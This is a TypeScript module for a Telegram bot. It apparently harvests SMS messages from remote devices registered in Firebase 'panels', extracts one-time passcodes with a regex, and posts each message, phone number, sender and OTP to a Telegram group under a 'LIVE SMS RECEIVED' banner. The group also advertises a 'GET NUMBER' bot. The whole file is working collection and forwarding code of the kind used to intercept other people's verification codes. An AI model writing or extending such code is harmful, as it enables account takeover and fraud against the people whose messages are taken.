import { db, panelsTable, pool, smsLogEntriesTable } from "@workspace/db";
import { sql } from "drizzle-orm";
import { fetchDeviceSms, fetchPanelDevices, type FirebaseDevice, type FirebaseSmsMessage } from "./firebase";
import { getBot } from "./bot";
import { logger } from "./logger";

const SMS_LOG_GROUP_ID = process.env.SMS_LOG_GROUP_ID || "-1002847599431";
const SMS_LOG_GET_NUMBER_URL = process.env.SMS_LOG_GET_NUMBER_URL || "https://t.me/Annebellasmsbot?start=promo";
const WATCH_INTERVAL_MS = positiveIntegerEnv("SMS_LOG_WATCH_INTERVAL_MS", 45000);
const PANEL_CONCURRENCY = positiveIntegerEnv("SMS_LOG_PANEL_CONCURRENCY", 3);
const DEVICE_CONCURRENCY = positiveIntegerEnv("SMS_LOG_DEVICE_CONCURRENCY", 8);
const SEND_CONCURRENCY = 4;
const MAX_MESSAGES_PER_DEVICE = 4;
const MAX_PENDING_PER_POLL = 80;
const EMPTY_PANEL_COOLDOWN_MS = positiveIntegerEnv("SMS_LOG_EMPTY_PANEL_COOLDOWN_MS", 180000);
const inFlightSms = new Set<string>();
const nextPanelScanAt = new Map<number, number>();
let interval: NodeJS.Timeout | null = null;
let running = false;
let initialized = false;
let storageReady = false;

type Panel = typeof panelsTable.$inferSelect;
type PendingSmsLog = {
  key: string;
  panelName: string;
  panelId: number;
  device: FirebaseDevice;
  message: FirebaseSmsMessage;
};

const E = {
  sms: "5453900977432188793",
  panel: "5282843764451195532",
  phone: "6206446249181189526",
  device: "5237761614458933049",
  profile: "5206318837489743801",
  key: "5249273776079640466",
  timer: "5246842176050046092",
  note: "6206108815075579644",
  online: "5440621591387980068",
  update: "5436128410609417960",
  support: "6026056450223116307",
};

const E_FB: Record<string, string> = {
  "5453900977432188793": "💬",
  "5282843764451195532": "🖥️",
  "6035152649790164056": "🖥️",
  "6206446249181189526": "📱",
  "5237761614458933049": "📟",
  "5206318837489743801": "👤",
  "5249273776079640466": "🔑",
  "5246842176050046092": "⏱️",
  "6206108815075579644": "🎵",
  "5440621591387980068": "🟢",
  "5436128410609417960": "🔔",
  "6026056450223116307": "🖥️",
};

function positiveIntegerEnv(name: string, fallback: number): number {
  const value = Number(process.env[name] || fallback);
  return Number.isFinite(value) && value > 0 ? Math.floor(value) : fallback;
}

function em(id: string): string {
  return `<tg-emoji emoji-id="${id}">${E_FB[id] ?? "•"}</tg-emoji>`;
}

function divider(): string {
  return "〰️〰️〰️〰️〰️〰️〰️〰️〰️";
}

const SC_MAP: Record<string, string> = {
  A: "ᴀ", B: "ʙ", C: "ᴄ", D: "ᴅ", E: "ᴇ", F: "ꜰ", G: "ɢ", H: "ʜ", I: "ɪ",
  J: "ᴊ", K: "ᴋ", L: "ʟ", M: "ᴍ", N: "ɴ", O: "ᴏ", P: "ᴘ", Q: "ǫ", R: "ʀ",
  S: "ꜱ", T: "ᴛ", U: "ᴜ", V: "ᴠ", W: "ᴡ", X: "x", Y: "ʏ", Z: "ᴢ",
};

function sc(html: string): string {
  let out = "";
  let inTag = false;
  for (let i = 0; i < html.length; i++) {
    const character = html[i];
    if (character === "<") {
      inTag = true;
      out += character;
    } else if (character === ">") {
      inTag = false;
      out += character;
    } else if (inTag) {
      out += character;
    } else {
      out += SC_MAP[character] ?? character;
    }
  }
  return out;
}

function sct(text: string): string {
  return text.split("").map((character) => SC_MAP[character] ?? character).join("");
}

function escapeHtml(value: string): string {
  return value.replace(/[&<>"']/g, (character) => {
    const entities: Record<string, string> = {
      "&": "&amp;",
      "<": "&lt;",
      ">": "&gt;",
      '"': "&quot;",
      "'": "&#39;",
    };
    return entities[character] ?? character;
  });
}

async function mapWithConcurrency<T, R>(
  items: T[],
  concurrency: number,
  mapper: (item: T) => Promise<R>,
): Promise<R[]> {
  const results: R[] = [];
  let cursor = 0;
  const workers = Array.from({ length: Math.min(concurrency, items.length) }, async () => {
    while (cursor < items.length) {
      const index = cursor++;
      results[index] = await mapper(items[index]);
    }
  });
  await Promise.all(workers);
  return results;
}

function isKnownSmsLogStorageError(err: unknown): boolean {
  const message = err instanceof Error ? err.message : String(err);
  return message.includes("invalid input syntax for type interval") || message.includes("sms_log_entries");
}

function smsLogKeyboard() {
  return {
    inline_keyboard: [[
      {
        text: sct("GET NUMBER"),
        url: SMS_LOG_GET_NUMBER_URL,
        style: "success",
        icon_custom_emoji_id: E.phone,
      },
      {
        text: sct("UPDATE"),
        url: "https://t.me/annebellaiprn",
        style: "primary",
        icon_custom_emoji_id: E.update,
      },
    ], [
      {
        text: sct("DEVELOPER"),
        url: "https://t.me/annebella",
        style: "danger",
        icon_custom_emoji_id: E.support,
      },
    ]],
  };
}

function stripPremiumButtonFields(payload: Record<string, unknown>): Record<string, unknown> {
  const clone = JSON.parse(JSON.stringify(payload));
  for (const row of clone.reply_markup?.inline_keyboard ?? []) {
    for (const button of row) {
      delete button.style;
      delete button.icon_custom_emoji_id;
    }
  }
  return clone;
}

async function rawTelegramRequest(method: string, payload: Record<string, unknown>): Promise<{ ok: boolean; description?: string }> {
  const token = process.env.TELEGRAM_BOT_TOKEN;
  if (!token) return { ok: false, description: "Missing TELEGRAM_BOT_TOKEN" };

  const response = await fetch(`https://api.telegram.org/bot${token}/${method}`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(payload),
  });
  return response.json() as Promise<{ ok: boolean; description?: string }>;
}

async function sendSmsLog(text: string): Promise<void> {
  const bot = getBot();
  const payload = {
    chat_id: SMS_LOG_GROUP_ID,
    text,
    parse_mode: "HTML",
    disable_web_page_preview: true,
    reply_markup: smsLogKeyboard(),
  };

  const result = await rawTelegramRequest("sendMessage", payload);
  if (result.ok) return;

  const fallback = await rawTelegramRequest("sendMessage", stripPremiumButtonFields(payload));
  if (fallback.ok) return;

  if (!bot) throw new Error(result.description || fallback.description || "Telegram bot is not initialized");
  await bot.sendMessage(SMS_LOG_GROUP_ID, text, {
    parse_mode: "HTML",
    disable_web_page_preview: true,
    reply_markup: smsLogKeyboard(),
  });
}

function smsKey(panelId: number, deviceId: string, message: FirebaseSmsMessage): string {
  return [
    panelId,
    deviceId,
    message.timestampMs ?? message.time,
    message.sender,
    message.text,
  ].join("|");
}

async function ensureSmsLogStorage(): Promise<void> {
  if (storageReady) return;
  await pool.query(`
    DO $$
    DECLARE
      bad_columns integer;
    BEGIN
      IF to_regclass('sms_log_entries') IS NOT NULL THEN
        SELECT COUNT(*) INTO bad_columns
        FROM information_schema.columns
        WHERE table_schema = current_schema()
          AND table_name = 'sms_log_entries'
          AND (
            (column_name = 'sms_key' AND data_type <> 'text') OR
            (column_name = 'panel_id' AND data_type <> 'integer') OR
            (column_name = 'device_id' AND data_type <> 'text') OR
            (column_name = 'sender' AND data_type <> 'text') OR
            (column_name = 'message_text' AND data_type <> 'text') OR
            (column_name = 'message_time' AND data_type <> 'text') OR
            (column_name = 'sent_at' AND data_type <> 'timestamp with time zone') OR
            (column_name = 'attempts' AND data_type <> 'integer')
          );

        IF bad_columns > 0 THEN
          DROP TABLE sms_log_entries;
        END IF;
      END IF;
    END $$;
  `);
  await pool.query(`
    CREATE TABLE IF NOT EXISTS sms_log_entries (
      id serial PRIMARY KEY,
      sms_key text NOT NULL UNIQUE,
      panel_id integer NOT NULL,
      device_id text NOT NULL,
      sender text,
      message_text text NOT NULL,
      message_time text,
      sent_at timestamptz,
      attempts integer NOT NULL DEFAULT 0,
      created_at timestamptz NOT NULL DEFAULT now()
    )
  `);
  await pool.query("ALTER TABLE sms_log_entries ADD COLUMN IF NOT EXISTS sent_at timestamptz");
  await pool.query("ALTER TABLE sms_log_entries ADD COLUMN IF NOT EXISTS attempts integer NOT NULL DEFAULT 0");
  storageReady = true;
}

async function resetSmsLogStorageAfterSchemaError(): Promise<void> {
  storageReady = false;
  inFlightSms.clear();
  await pool.query("DROP TABLE IF EXISTS sms_log_entries");
  await ensureSmsLogStorage();
}

async function rememberExistingSms(key: string, panelId: number, deviceId: string, message: FirebaseSmsMessage): Promise<void> {
  await ensureSmsLogStorage();

  try {
    await db
      .insert(smsLogEntriesTable)
      .values({
        smsKey: key,
        panelId,
        deviceId,
        sender: message.sender || null,
        messageText: message.text,
        messageTime: message.time || null,
        sentAt: new Date(),
        attempts: 0,
      })
      .onConflictDoNothing({ target: smsLogEntriesTable.smsKey });
  } catch (err) {
    if (!isKnownSmsLogStorageError(err)) throw err;
    logger.warn({ err }, "Repairing SMS log dedupe table after schema mismatch");
    await resetSmsLogStorageAfterSchemaError();
  }
}

async function reserveSmsForLogging(key: string, panelId: number, deviceId: string, message: FirebaseSmsMessage): Promise<boolean> {
  if (inFlightSms.has(key)) return false;
  inFlightSms.add(key);
  await ensureSmsLogStorage();

  let result;
  try {
    result = await pool.query(
      `
        INSERT INTO sms_log_entries (sms_key, panel_id, device_id, sender, message_text, message_time, attempts)
        VALUES ($1, $2, $3, $4, $5, $6, 1)
        ON CONFLICT (sms_key) DO UPDATE
          SET attempts = sms_log_entries.attempts + 1
          WHERE sms_log_entries.sent_at IS NULL
        RETURNING id
      `,
      [key, panelId, deviceId, message.sender || null, message.text, message.time || null]
    );
  } catch (err) {
    inFlightSms.delete(key);
    if (!isKnownSmsLogStorageError(err)) throw err;
    logger.warn({ err }, "Repairing SMS log dedupe table after reserve failure");
    await resetSmsLogStorageAfterSchemaError();
    return false;
  }

  if (result.rowCount === 0) {
    inFlightSms.delete(key);
    return false;
  }

  return true;
}

async function markSmsSent(key: string): Promise<void> {
  await pool.query("UPDATE sms_log_entries SET sent_at = now() WHERE sms_key = $1", [key]);
  inFlightSms.delete(key);
}

function releaseSmsReservation(key: string): void {
  inFlightSms.delete(key);
}

async function trimSmsLogStorage(): Promise<void> {
  await db.execute(sql`
    DELETE FROM sms_log_entries
    WHERE sent_at IS NOT NULL
    AND id NOT IN (
      SELECT id FROM sms_log_entries
      ORDER BY id DESC
      LIMIT 5000
    )
  `);
}

function extractOtp(text: string): string | null {
  const match = text.match(/\b(\d{4,8})\b/);
  return match?.[1] ?? null;
}

function formatSmsLog(panelName: string, device: FirebaseDevice, message: FirebaseSmsMessage): string {
  const otp = extractOtp(message.text);
  const phone = device.phoneNumber && device.phoneNumber !== "—" ? device.phoneNumber : "Unknown";
  return (
    `${em(E.sms)} <b>LIVE SMS RECEIVED</b>\n` +
    `${divider()}\n\n` +
    `${em(E.panel)} <b>PANEL</b>  : ${escapeHtml(panelName)}\n` +
    `${em(E.phone)} <b>NUMBER</b> : <code>${escapeHtml(phone)}</code>\n` +
    `${em(E.device)} <b>DEVICE</b> : ${escapeHtml(device.name || device.id)}\n` +
    `${em(E.profile)} <b>SENDER</b> : ${escapeHtml(message.sender || "Unknown")}\n` +
    (otp ? `${em(E.key)} <b>OTP</b>    : <code>${escapeHtml(otp)}</code>\n` : "") +
    `${em(E.timer)} <b>TIME</b>   : ${escapeHtml(message.time || "Live")}\n` +
    `${em(E.online)} <b>STATUS</b> : LIVE\n\n` +
    `${divider()}\n` +
    `${em(E.note)} <b>MESSAGE</b>\n` +
    `${escapeHtml(message.text).slice(0, 1200)}`
  );
}

async function collectPanelSmsLogs(panel: Panel): Promise<PendingSmsLog[]> {
  const now = Date.now();
  if ((nextPanelScanAt.get(panel.id) ?? 0) > now) return [];

  const devices = await fetchPanelDevices(panel.firebaseUrl, panel.secretKey, panel.id, panel.name);
  if (!devices.length) {
    nextPanelScanAt.set(panel.id, now + EMPTY_PANEL_COOLDOWN_MS);
    return [];
  }

  nextPanelScanAt.delete(panel.id);
  const onlineDevices = devices.filter((device) => device.status);

  const perDevice = await mapWithConcurrency(
    onlineDevices,
    DEVICE_CONCURRENCY,
    async (device) => {
      const messages = await fetchDeviceSms(panel.firebaseUrl, panel.secretKey, device.id);
      const newest = messages.slice(0, MAX_MESSAGES_PER_DEVICE);
      const pending: PendingSmsLog[] = [];

      for (const message of newest.reverse()) {
        const key = smsKey(panel.id, device.id, message);
        if (!initialized) {
          await rememberExistingSms(key, panel.id, device.id, message);
          continue;
        }

        const shouldLog = await reserveSmsForLogging(key, panel.id, device.id, message);
        if (!shouldLog) continue;
        pending.push({ key, panelName: panel.name, panelId: panel.id, device, message });
      }

      return pending;
    },
  );

  return perDevice.flat();
}

async function sendPendingSmsLog(entry: PendingSmsLog): Promise<void> {
  try {
    await sendSmsLog(sc(formatSmsLog(entry.panelName, entry.device, entry.message)));
    await markSmsSent(entry.key);
  } catch (err) {
    releaseSmsReservation(entry.key);
    logger.warn({ err, panelId: entry.panelId, deviceId: entry.device.id }, "Failed to send SMS log");
  }
}

async function sendPendingSmsLogs(entries: PendingSmsLog[]): Promise<void> {
  let cursor = 0;
  const workers = Array.from({ length: Math.min(SEND_CONCURRENCY, entries.length) }, async () => {
    while (cursor < entries.length) {
      const entry = entries[cursor++];
      await sendPendingSmsLog(entry);
      await new Promise((resolve) => setTimeout(resolve, 80));
    }
  });
  await Promise.all(workers);
}

async function pollSmsLogs(): Promise<void> {
  if (running) return;
  const bot = getBot();
  if (!bot) return;

  running = true;
  try {
    await ensureSmsLogStorage();
    const panels = await db.select().from(panelsTable);
    const pending = (await mapWithConcurrency(panels, PANEL_CONCURRENCY, (panel) => collectPanelSmsLogs(panel)))
      .flat()
      .slice(0, MAX_PENDING_PER_POLL);
    pending.sort((a, b) => (a.message.timestampMs ?? 0) - (b.message.timestampMs ?? 0));
    await sendPendingSmsLogs(pending);
    void trimSmsLogStorage().catch((err) => logger.warn({ err }, "Failed to trim SMS log dedupe table"));
    initialized = true;
  } catch (err) {
    logger.error({ err }, "SMS log watcher poll failed");
  } finally {
    running = false;
  }
}

export function startSmsLogWatcher(): void {
  if (interval) return;
  void pollSmsLogs();
  interval = setInterval(() => void pollSmsLogs(), WATCH_INTERVAL_MS);
  logger.info({ groupId: SMS_LOG_GROUP_ID, intervalMs: WATCH_INTERVAL_MS }, "SMS log watcher started");
}
